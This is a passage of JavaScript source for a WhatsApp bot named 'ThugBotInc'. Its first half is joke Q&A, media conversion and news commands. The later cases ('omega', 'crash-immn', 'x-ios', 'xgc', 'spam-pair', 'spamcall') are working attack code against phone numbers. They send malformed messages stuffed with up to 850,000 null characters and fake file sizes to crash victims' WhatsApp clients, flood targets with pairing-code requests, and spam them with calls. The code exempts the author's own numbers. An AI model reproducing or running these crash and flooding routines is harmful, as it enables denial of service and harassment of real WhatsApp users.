        "💀 No idea, and honestly, I don't want to know.", "😅 Maybe go read a book?", "🔥 That’s classified. And you’re not cool enough to know.", 
        "🛸 Even aliens wouldn't waste their time on this.", "🚀 That’s beyond my knowledge, but so is basic math for you.", 
        "📚 Let me check… Nope, still don’t care.", "🙃 Let’s pretend I didn’t hear that question.", 
        "🦉 Ask an owl. They’re smarter than you.", "🧠 My intelligence just dropped reading that.", 
        "🔮 Maybe in another life, you’d be smarter.", "😜 Try again, but this time, think first.", 
        "🤓 I should know this… but I don’t care enough to answer.", "🥴 Brain freeze from your nonsense.", 
        "🙈 Let’s move on before I lose more IQ points.", "🎭 This must be a joke, right?", 
        "🤡 Are you a clown? Because that question was a joke.", "🧩 A puzzle… that no one wants to solve.", 
        "🔍 You’re looking for answers in the wrong place.", "😆 Not today, buddy.", 
        "🎯 Good question, but you won’t like the answer.", "😂 You wish I had time for this.", "🤐 No comment, because it’s not worth it.", 
        "🤖 Ask ChatGPT. Oh wait, that’s me. Still don’t care.", "📝 Let me write that down… just kidding.", 
        "📡 Signal lost. Probably a good thing.", "📵 I’m offline, pretend I didn’t hear that.", "🥶 Too cold to answer.", 
        "🤬 That’s a dumb question. Next!", "😈 You don’t want to hear my real answer.", "🚪 Close this chat and try again.", 
        "👻 Even ghosts wouldn’t answer that.", "🤠 I reckon that’s a waste of time.", 
        "🐒 Even a monkey would’ve asked something better.", "🌪️ My brain just crashed.", "🤡 The joke’s on you!"
    ];
    
    let kah = lel[Math.floor(Math.random() * lel.length)];
    let jawab = `*What ${text}*\n*💡 Answer: ${kah}*`;

    await reply(jawab);
}
break;
case 'can': {
    if (!text) return reply(`*Ask a question!*\n*Example: ${prefix + command} I dance?*`);

    let bisa = [
        "✅ Yes, but don’t embarrass yourself.", "❌ No, and you probably shouldn't even try.",
        "🤡 Can't, but you sure can clown around.", "💀 Absolutely not, I’m begging you.",
        "🚀 Of course! But not on this planet.", "😂 Sure, if you enjoy failing.",
        "🙄 Can? Yes. Should you? Absolutely not.", "🧐 You *can*, but the world isn’t ready for that disaster.",
        "😆 You’re asking *me* for permission? Bro.", "🔥 Go for it, make a fool of yourself.",
        "🎨 You *can*, but your art is a disaster.", "⛺ You can, but please, for the sake of humanity, don’t.",
        "🛑 Should you? I highly doubt it.", "🚴‍♂️ Yes, but I can’t promise you’ll succeed.",
        "🧠 You can, but do you have the brains for it?", "🦦 Yeah, but you'll be slow and awkward.",
        "🎮 Go ahead, but expect to lose.", "👀 Yes, but only if you're prepared for failure.",
        "🐱 I guess, but it’s going to be embarrassing.", "💔 Sure, but your chances at success are slim.",
        "🦾 I don't see it happening, but good luck.", "💥 Sure, but only after a huge explosion.",
        "🏆 You *can*... just like anyone else.", "🤪 Of course! Just be prepared for disappointment.",
        "🍕 Yes, but you’ll likely regret it.", "🧚‍♂️ Sure, if a fairy waves a magic wand.", "👑 Yes, but don't expect to be crowned.",
        "🎤 You can sing... if your neighbors don't mind.", "🚁 Sure, but your chances are about as good as a helicopter.",
        "🐾 Yes, but only in a fictional world.", "🎮 Yes, but it’s game over for your dignity.",
        "🎻 Sure, but you’ll hit all the wrong notes.", "💎 Yes, but you’re not a diamond.",
        "🚨 Sure, but this could be an emergency.", "⏳ Yes, but time is running out.",
        "🌞 Sure, but only in the morning.", "🎸 Yes, but be prepared for a loud disaster.",
        "⚙️ You can, but the mechanics of this are confusing.", "🚶‍♂️ Sure, but it’ll take a lot of steps.",
        "🦷 Can you? Sure, but you'll probably trip over your feet.", "🕵️‍♂️ You can, but I’ll be watching closely.",
        "👽 You *can*... but only if you're from another planet.", "🎢 Sure, but life’s a rollercoaster.",
        "💼 Yes, but only if you act serious.", "🍿 You can, but it’s going to be a popcorn moment.",
        "🚪 Sure, but don't expect the door to stay open forever.",
        "🐶 Yes, but don't expect a dog to help you."
    ];

    let keh = bisa[Math.floor(Math.random() * bisa.length)];
    let jawab = `*Can ${text}*\n*🔮 Answer: ${keh}*`;

    await reply(jawab);
}
break;
case 'is': {
    if (!text) return reply(`*Ask a question!*\n\nExample: ${prefix + command} she a virgin?`);

    let apa = [
        "✅ Yes, and that's all I’ll say.", "❌ No, and that’s all I’ll say.",
        "🤷‍♂️ Could be, could not be... just like your chances in life.", "😏 That's right, and you’ll never know why.",
        "🤡 Bro, even I don’t have time for this nonsense.", "💀 If you need to ask, you already know the answer.",
        "😂 Ask someone who actually cares.", "🚀 NASA can't even solve this mystery.",
        "🙃 I’d tell you, but then I’d have to delete myself.", "🧐 Even the FBI doesn't have an answer for that.",
        "💔 If you’re asking, it’s probably a no.", "🔍 Who knows? But it doesn't matter.",
        "🎭 Is? It’s a mystery, just like your logic.", "🍀 I’m not sure, but good luck finding out.",
        "🌪️ Spinning around, trying to figure that out.", "📞 Call someone else for this answer.",
        "💬 Ask someone who cares, maybe they'll have the answer.", "🌍 The world may never know.",
        "🚪 Exit stage left, you'll figure it out someday.", "🦅 Maybe ask a bird, they’re more informed.",
        "🛑 Stop asking, it’s already too much.", "📱 Try texting someone else.",
        "🎉 Who cares? Let’s just move on.", "⚡ Zap! That’s a dead end.",
        "🐍 Ask a snake, maybe they have the answer.", "🎸 Strum the truth, but it’s not clear.",
        "💨 It’s as elusive as the wind.", "💻 Open your mind, but it’s too confusing.",
        "🍂 Falling leaves may have the answer, but probably not.", "🔮 The future is blurry, like this question.",
        "🕵️‍♂️ Investigating? You'll never get the full picture.", "🍕 Even pizza can’t answer that.",
        "🍀 Maybe luck will reveal the truth.", "📡 Searching for an answer, but no signal found."
    ];

    let kah = apa[Math.floor(Math.random() * apa.length)];
    let jawab = `*Is ${text}*\n*🎭 Answer: ${kah}*`;

    await reply(jawab);
}
break;
case 'where': {
    if (!text) return reply(`Ask a question\n\nExample : ${prefix + command} is your name?`);
    let wherelol = [
        `In the abyss of your confusion.🌌`,
        `In the underworld, just where your sense of humor lies.💀`,
        `In the depths of your imagination, where logic doesn’t exist.🧠`,
        `On Pluto, because even Mars wouldn’t take you.🪐`,
        `In a parallel universe, where people actually care.🌍`,
        `In a time machine, traveling to when you actually asked a good question.⌛`,
        `In a mirror, but you'd probably not recognize your own reflection.🪞`,
        `On the Titanic, going down with all your bad ideas.🚢`,
        `In the Twilight Zone, where everything you say is just as bizarre.📺`,
        `In a cave, far away from the real world.⛰️`,
        `On a deserted island, just like your chances of getting a good answer.🏝️`,
        `On a rollercoaster, because your logic is just as twisted.🎢`,
        `In the void, where everything you say gets sucked away.🕳️`,
        `In the Matrix, where things make more sense than your questions.💻`,
        `In a dystopian future, where your ideas have been outlawed.🌆`,
        `On a spaceship, floating aimlessly through space.🚀`,
        `In the Bermuda Triangle, where your questions vanish without a trace.🔺`,
        `Under a rock, because that’s where you’re hiding your good questions.🪨`,
        `In a circus tent, because you're the main act.🤡`,
        `In an alternate timeline where everything you say is still confusing.⏳`,
        `In the garbage, because that’s where your logic belongs.🗑️`,
        `On a rollercoaster of emotions, and you're stuck on the bottom.🎢`,
        `In a science fiction novel, because this feels unreal.📚`,
        `On a cloud, but not in the way you'd hope.☁️`,
        `On a deserted beach, because that’s where your sense of humor went.🏖️`,
        `In a game of hide and seek, but no one is looking.🎮`,
        `In a black hole, where even time and space are trying to escape you.🌀`,
        `In a jungle, surrounded by wild nonsense.🐒`,
        `In a maze, and you can’t find your way out.🌀`,
        `On Mars, where even the aliens are confused by you.👽`
    ];
    let kah = wherelol[Math.floor(Math.random() * wherelol.length)];
    let jawab = `*Where ${text}*\n*Answer: ${kah}*`;
    await reply(jawab);
}
break;

case 'how': {
    if (!text) return reply(`*Ask a question*\n*Example : ${prefix + command} to date a girl?*`);
    let gimana = [
        `Use your brain, it’s been waiting to be used.🧠`,
        `It's as difficult as understanding you.😵`,
        `Even Google is confused by this question.🔍`,
        `Try asking someone who actually cares, I’m busy.⏳`,
        `Did you try asking your dog for advice?🐕`,
        `It's not that hard... or is it?🤔`,
        `Look it up, I’m not your personal life coach.📱`,
        `Dizzy Ah😴, I’m about to lose consciousness from this question.🌀`,
        `You know what? Just try anything... it can’t get worse.🙄`,
        `Well, try something that actually makes sense.🤯`,
        `Ask someone who hasn't just woken up from a nap.🛏️`,
        `Do something useful with that energy of yours.⚡`,
        `It’s as simple as you can make it, but that’s not saying much.😒`,
        `Just wing it... but don't be surprised if it crashes.💥`,
        `You might want to try doing the opposite of whatever you're thinking.🧠❌`,
        `Honestly, I don't even know where to start with this.🤷‍♂️`,
        `If you're asking me for advice, it’s already too late.⏰`,
        `How? Let’s start with getting a basic question right first.💡`,
        `Ummm... maybe try a little harder?💪`,
        `Not sure if I can explain it in a way that you'd understand.😬`,
        `Try using that thing you call common sense... if it exists.🧠`,
        `How? Well, you could start by not asking questions like this.🙃`,
        `Simple steps, but you're probably too busy overthinking it.🤔`,
        `Take it slow... but not too slow, we all know your pace.🐢`,
        `You can try, but we both know how this is going to turn out.💥`,
        `Are you sure you even want to know? Just live your life.😎`,
        `I think you're overcomplicating this, but hey, it’s you.🤷‍♂️`
    ];
    let kah = gimana[Math.floor(Math.random() * gimana.length)];
    let jawab = `*How ${text}*\n*Answer: ${kah}*`
    await reply(jawab);
}
break;

case 'rate': {
    if (!text) return reply(`*Example: ${prefix + command} my profile*`);
    let ra = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100'];
    let kah = ra[Math.floor(Math.random() * ra.length)];
    let insult = kah < 50 ? 
        [
            `💀 Bro, even Wi-Fi signals have better consistency than you.`,
            `😂 This is generous, considering your personality.`,
            `🔥 That’s just because I’m feeling nice today.`,
            `🙃 That’s a 10 out of 100, not 10 out of 10.`,
            `😆 Too high? Blame my broken algorithm.`,
            `🤡 Congratulations, you've won the clown award.🎪`,
            `🧐 This was an error, I meant -10.`,
            `🚀 NASA called, they want their failure rate back.🛸`,
            `📉 Stocks in your self-esteem just crashed, mate.📉`,
            `💀 Your profile’s worth as much as my phone battery right now.📉`,
            `👻 Your personality is as flat as a ghost.👻`,
            `💥 Can you feel that? It’s the impact of that low score.🔥`,
            `🤦‍♂️ That rating just gave me a headache.🤕`,
            `🦗 Crickets are more exciting than that profile.🦗`,
            `🎭 It’s like a bad acting performance — we’re all just waiting for it to end.🎭`,
            `⏳ Time's up. That profile is stuck in the past.⏳`,
            `🕵️‍♂️ You’ve been rated, and your chances are still zero.🚫`,
            `🥴 This rating just made me lose 1% of my memory.🧠`,
            `🎯 Target missed. Better luck next time.🎯`,
            `💀 That rating just made me question reality.🌍`,
            `📉 Congratulations, your self-esteem has dropped another 10%.📉`,
            `🧨 Not even a dynamite blast can improve that profile.💥`,
            `🚀 Your profile is like a rocket launch... except it crashes before takeoff.💥`,
            `👎 You could try harder, but let’s be real, we both know how this will go.🙄`,
            `💨 Fastest way to the bottom, and you’re already there.⬇️`,
            `🚪 Exit stage left, and maybe rethink your life choices.👋`
        ][Math.floor(Math.random() * 30)] 
        : "⭐ Wow! You got lucky today, not everyone does. 😒";
    let jawab = `*Rate ${text}*\n*Answer: ${kah}%*\n*${insult}*`;
    await reply(jawab);
}
break;
            case 'tomp3': {
            if (/document/.test(mime)) return reply(`*Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}*`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`*Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}*`)
            if (!quoted) return reply(`*Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}*`)
            await loading()
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            ThugBotInc.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `꧁𝕿𝖍𝖚𝖌𝖓𝖎𝖋𝖎𝖈𝖊𝖓𝖙꧂X⌣X 🐥`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`*Reply to a video/audio to convert to VN ${prefix + command}*`)
            if (!quoted) return reply(`*Reply to a video/audio to convert to VN ${prefix + command}*`)
            await loading()
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            ThugBotInc.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) return reply('*Reply to a video*')
                if (!/webp/.test(mime)) return reply(`*Reply to an animated sticker with caption ${prefix + command}*`)
                await loading()
		let { webp2mp4File } = require('./lib/uploader')
                let media = await ThugBotInc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await ThugBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: '*Successfully coverted to gif*\n> © 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toqr':{
  if (!q) return reply('*Please include link or text!*')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await ThugBotInc.sendMessage(from, { image: medi, caption:"*© 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™*"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
case "jalantikus":

var reis = await JalanTikusMeme()
tekcs = ""
tekcs += "Jalan Tikus Meme\n\n"
tekcs += `Source: ${reis}`
tekcs += ""
ThugBotInc.sendMessage(m.chat, { image : { url : reis }, caption: tekcs }, { quoted:m })
break
case 'indozone':


IndozoneNews().then(async(res) => {
no = 0
iwannnnnn = ""
for (let i of res) {
no += 1
iwannnnnn += `\n• ${no.toString()} •\n`
iwannnnnn += `News: ${i.berita}\n`
iwannnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnn += `Type: ${i.berita_jenis}\n`
iwannnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnn += ""
ThugBotInc.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnn }, { quoted:m })
})
break
case 'inews':


iNews().then(async(res) => {
no = 0
iwannnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnn += `News: ${i.berita}\n`
iwannnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnn += `type: ${i.berita_jenis}\n`
iwannnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnn += ""
reply(iwannnnnnnnnn) 
})
break
case "merdeka":


MerdekaNews().then(async (res) => {
iwannnnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnnn += `News: ${i.berita}\n`
iwannnnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnnn += ""
ThugBotInc.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnnn }, { quoted:m })
})
break
case 'layarkaca':


if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
iwannn = ""
for (let i of res) {
no += 1
iwannn += `\n• ${no.toString()} •\n`
iwannn += `Film: ${i.film_title}\n`
iwannn += `Link: ${i.film_link}\n`
}
iwannn += ``
reply(iwannn) 
})
break
case 'gitstalk': case 'githubstalk': {
    if (!text) return reply(`*🚀 Example: ${prefix + command} DEMONST3R-CODER*`);
    await loading();

    try {
        const res = await fetch(`https://apis.davidcyriltech.my.id/githubStalk?user=${encodeURIComponent(text)}`);
        const json = await res.json();

        if (!json || !json.username) return reply(`⚠️ User not found!`);

        const { 
            username = "N/A", nickname = "N/A", bio = "No bio available", id = "N/A", 
            profile_pic = "", url = "N/A", type = "N/A", location = "Unknown", 
            public_repositories = "0", followers = "0", following = "0", 
            created_at = "N/A", updated_at = "N/A", public_gists = "0" 
        } = json;

        const caption = `📑 *GitHub Profile Stalker* 📑\n👨‍💼 *𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴:* ${username}
📝 *𝙽𝙸𝙲𝙺𝙽𝙰𝙼𝙴:* ${nickname}
💡 *𝙱𝙸𝙾:* ${bio}
🆔 *𝙸𝙳:* ${id}
🔗 *𝙿𝚁𝙾𝙵𝙸𝙻𝙴 𝚄𝚁𝙻:* ${profile_pic || "N/A"}
🔗 *𝙶𝙸𝚃𝙷𝚄𝙱 𝚄𝚁𝙻:* ${url}
📦 *𝙿𝚄𝙱𝙻𝙸𝙲 𝚁𝙴𝙿𝙾𝚂𝙸𝚃𝙾𝚁𝚈:* ${public_repositories}
📜 *𝙿𝚄𝙱𝙻𝙸𝙲 𝙶𝙸𝚂𝚃:* ${public_gists}
👥 *𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂:* ${followers}
👤 *𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶:* ${following}
📅 *𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙾𝙽:* ${created_at}
🔄 *𝙻𝙰𝚂𝚃 𝚄𝙿𝙳𝙰𝚃𝙴: ${updated_at}*\n> © 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™*`;

        ThugBotInc.sendMessage(m.chat, { 
            image: { url: profile_pic || "https://i.imgur.com/Y1bZ6Bp.png" }, // Default profile pic
            caption 
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        reply(`⚠️ An error occurred while fetching data.`);
    }
}
break;

case 'playstore': {
    if (!text) return reply(`*𝙿𝚁𝙾𝚅𝙸𝙳𝙴 𝙰 𝚂𝙴𝙰𝚁𝙲𝙷 𝚀𝚄𝙴𝚁𝚈*\n*𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix + command} 𝙵𝚁𝙴𝙴 𝙵𝙸𝚁𝙴 𝙼𝙰𝚇*`);
    
    await loading();

    try {
        const res = await fetch(`https://apis.davidcyriltech.my.id/search/playstore?q=${encodeURIComponent(text)}`);
        const json = await res.json();

        if (!json || json.length === 0) return reply(`*❌ 𝙽𝙾 𝚁𝙴𝚂𝚄𝙻𝚃𝚂 𝙵𝙾𝚄𝙽𝙳!*`);

        const { title, installs, score, price, developer, icon, url } = json[0]; // Assuming the response is an array

        const caption = `👾 *𝙿𝙻𝙰𝚈 𝚂𝚃𝙾𝚁𝙴 𝙰𝙿𝙿 𝙸𝙽𝙵𝙾* 👾

📑 *𝙽𝙰𝙼𝙴:* ${title}
📥 *𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝚂:* ${installs}
⭐ *𝚁𝙰𝚃𝙸𝙽𝙶:* ${score}
💵 *𝙿𝚁𝙸𝙲𝙴:* ${price}
👨‍💻 *𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁:* ${developer}
🔗 *𝚄𝚁𝙻:* ${url}`;

        await ThugBotInc.sendMessage(m.chat, { 
            image: { url: icon }, 
            caption: `> © 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™`
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        reply(`*⚠️ 𝙰𝙽 𝙴𝚁𝚁𝙾𝚁 𝙾𝙲𝙲𝚄𝚁𝚁𝙴𝙳 𝚆𝙷𝙸𝙻𝙴 𝙵𝙴𝚃𝙲𝙷𝙸𝙽𝙶 𝙳𝙰𝚃𝙰.*`);
    }
}
break;
case 'omega': case 'crash-immn': case 'beta-crash':
    if (!isPremium) return replyprem(mess.premium)
    if (!ThugTheCreator) return reply(mess.owner)
	if (!q) return reply(`*Example:*\n*${prefix + command} 234###*`)
victim = text.split("|")[0]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await ThugBotInc.onWhatsApp(Xreturn);
  if (victim == "2347079059033") {
    return;
    }
    if (victim == "2349153596300") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("*The number is not registered on WhatsApp*");
  }
  reply(`*Target successfully engaged using ${command}!*\n*🎯 Target ID:* ${target}\n*📑 Status Report: Successfully*`);
    for (let count = 0; count < 10; count++) {  // تكرار 10 مرات
    
        tmsg = await generateWAMessageFromContent(Xreturn, {
            "buttonsMessage": {
                "text": "° ᎴᎩᏁᏗ ᏦᎥᏝᏝ",
                "imageMessage": {
                    "url": "https://mmg.whatsapp.net/v/t62.7118-24/21432291_3992350524356755_3359175269186937102_n.enc?ccb=11-4&oh=01_Q5AaIK5gi1wSNDajnd99Ao1_3-ywQg_hopUd_hpbnEe0bIBd&oe=67C77FF2&_nc_sid=5e03e0&mms3=true",
                    "mimetype": "image/jpeg",
                    "fileSha256": "Wnf6QkilVowZ5j2UfTlNNF3LQ8g16qLi3QzYXhiObO0=",
                    "fileLength": "92017",
                    "height": 640,
                    "width": 640,
                    "mediaKey": "8Kz+VGfENvlBayk1bPdmzAkuqPlDMDrcc4ucoC4adWQ=",
                    "fileEncSha256": "++njdY0Csz3sCDfQnDFZ+lWyaCjbPhV0jtF5nL0O+3Y=",
                    "directPath": "/v/t62.7118-24/21432291_3992350524356755_3359175269186937102_n.enc",
                    "mediaKeyTimestamp": "1738541032",
                    "jpegThumbnail": pici
                },
                "contentText": "ᎴᎩᏁᏗ ᏦᎥᏝᏝ",
                "footerText": "ᎴᎩᏁᏗ ᏦᎥᏝᏝ",
                "buttons": [
                    {
                        "buttonId": "\u0000".repeat(399999),
                        "buttonText": {"displayText": "@DGXeon"},
                        "type": "RESPONSE"
                    }
                ],
                "headerType": "IMAGE"
            }
        }, {});

        await ThugBotInc.relayMessage("status@broadcast", tmsg.message, {
            messageId: tmsg.key.id,
            statusJidList: [Xreturn],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: Xreturn },
                                    content: undefined,
                                }
                            ],
                        }
                    ],
                }
            ],
        });

        const iamquoted = {
            key: {
                fromMe: false,
                stanzaId: tmsg.key.id,
                participant: "13135550002@s.whatsapp.net",
                remoteJid: "status@broadcast",
            },
            message: {
                extendedTextMessage: {
                    text: '*~_ᎴᎩᏁᏗ ᏦᎥᏝᏝ_~*'
                }
            }
        };

        await ThugBotInc.sendMessage(Xreturn, { text: '\n' }, { quoted: fstatus });

        await sleep(10000);

        for (let i = 0; i < 50; i++) {
            await ThugBotInc.relayMessage(Xreturn, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2,
                        },
                        interactiveMessage: {
                            body: {
                                text: " ᎴᎩᏁᏗ ᏦᎥᏝᏝ ",
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    { name: "single_select", buttonParamsJson: "" },
                                    { name: "call_permission_request", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                ]
                            }
                        }
                    }
                }
            }, { participant: { jid: Xreturn } });
        }
    }

    break;
case "x-ios": {
if (!ThugTheCreator) return reply(mess.owner)
if (!isPremium) return replyprem(mess.premium)
if (!q) return reply(`*Example*\n*${prefix + command} 234###*`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`*Target successfully engaged using ${command}! 🏹*\n*🎯 Target ID:* ${target}\n*📑 Status Report: Successfully*`);
for (let i = 0; i < 10; i++) {
await iosc(target)
await iosc(target)
await sleep(1)
}
ThugBotInc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}
break

case 'spam-pair': {
	if (!isOwner) return reply(mess.premium)
			if (!q) return reply(`*Usage: ${prefix+command} number*\n*Example : ${prefix+command} 234####*`)
			let [peenis, pepekk = "200"] = q.split("|")
			
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@adiwajshing/baileys')
			let {
				state
			} = await useMultiFileAuthState('XSession')
			let {
				version
			} = await fetchLatestBaileysVersion()
	 reply(`Success!`)
			let sucked = await makeWaSocket({
				auth: state,
				version,
				logger: pino({
					level: 'fatal'
				})
			})
			for (let i = 0; i < pepekk; i++) {
				await sleep(1500)
				let prc = await sucked.requestPairingCode(target)
				await console.log(`Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
			}
			await sleep(15000)
			}
		break
		case 'omega': case 'hunt': case 'beta-crash' : case 'crash-immn' :{
if (!isPremium) return replyprem(mess.premium)
if (!ThugTheCreator) return reply(mess.owner)
if (!q) return reply(`*Example: ${prefix + command} 234###*`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`*Target successfully engaged using ${command}! 🏹*\n*🎯 Target ID:* ${target}\n*📑 Status Report: Processing......*`);
for (let i = 0; i < 70; i++) {
await allin(target)


}
reply(`*Target successfully engaged using ${command}! 🏹*\n*🎯 Target ID:* ${target}\n*📑 Status Report: Successfully*`);
await sleep(2000)
await ThugBotInc.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: fstatus
})
}
break




case 'xgc': case 'killgc': case 'crash':
if (!isPremium) return replyprem(mess.premium)
async function UnicornXeon(jides,definirText) {await ThugBotInc.relayMessage(jides, {extendedTextMessage: {text: definirText},"deviceSentMessage": {"phash": ""}}, {});}
const stanza = [{attrs: { biz_bot: '1' },tag: "bot",},{attrs: {},tag: "biz",},];
const xeoncres = {
quotedMessage: {
buttonsMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
fileLength: "9999999999999",
pageCount: 3567587327,
mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
fileName: "𝙾𝚁𝙴𝙺𝙸 🕊️🕊️🕊️",
fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
mediaKeyTimestamp: "1735456100",
contactVcard: true,
caption: "\n"
},
contentText: "🚫",
footerText: "🪪",
buttons: [{
buttonId: "\u0000".repeat(850000),
buttonText: {
displayText: "𐎟"
},
type: 1
}],
headerType: 3
}
}}
await reply(`*Bug is being sent*\n*Note: Do not unarchive this chat.*`)
await ThugBotInc.chatModify({archive: true,lastMessages: [{key: m.key,messageTimestamp: "9999",fromMe: false}]}, from)
await ThugBotInc.sendMessage(from, {text: "드림",mentions: [m.sender],footer: "드림",buttons: [{buttonId: "hi",buttonText: {displayText: m}},{buttonId: "hi2", buttonText: {displayText: m}}],viewOnce: true,headerType: 6,}, {})
for (let i = 0; i < 30; i++) {
await ThugBotInc.sendMessage(from, {sticker: {url: './T-Media/Hehe.webp'},contextInfo: {participant: "0@s.whatsapp.net",remoteJid: "status@broadcast",quotedMessage: xeoncres.quotedMessage}})
}
await test(m.chat)
await UnicornXeon(from, pushname)
await UnicornXeon(from, pushname)
await test(m.chat)
await test(m.chat)
await UnicornXeon(from, pushname)
await UnicornXeon(from, pushname)
await test(m.chat)
await sleep(3000)
await test(m.chat)
await UnicornXeon(from, pushname)
await UnicornXeon(from, pushname)
await test(m.chat)
await test(m.chat)
await UnicornXeon(from, pushname)
await UnicornXeon(from, pushname)
await test(m.chat)
break
case 'spamcall' : {
if (!isPremium) return replyprem(mess.premium)
if (!ThugTheCreator) return reply(mess.owner)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`*Target successfully engaged using ${command}! 🏹*\n*🎯 Target ID:* ${target}\n*📑 Status Report: Successfully*`);

for (let j = 0; j < 30; j++) {
 await sendOfferCall(target)
  }
